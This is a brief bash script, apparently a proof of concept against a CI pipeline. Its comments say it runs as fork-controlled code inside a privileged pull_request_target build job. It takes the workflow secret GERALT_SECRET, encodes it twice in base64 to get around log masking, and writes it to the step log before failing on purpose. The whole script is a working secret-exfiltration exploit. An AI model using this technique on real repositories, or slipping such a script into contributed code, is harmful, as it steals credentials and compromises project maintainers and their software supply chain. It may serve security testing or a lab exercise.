#!/bin/bash
set -e
# Fork-controlled script executed by tests.yml 'Build and push base image' step
# via $(...) command substitution in the privileged pull_request_target build job.
# GERALT_SECRET is exposed by workflow-level env; emit double-base64 to stderr so
# it survives log masking and is preserved in the step log, then fail explicitly.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)" >&2
exit 1
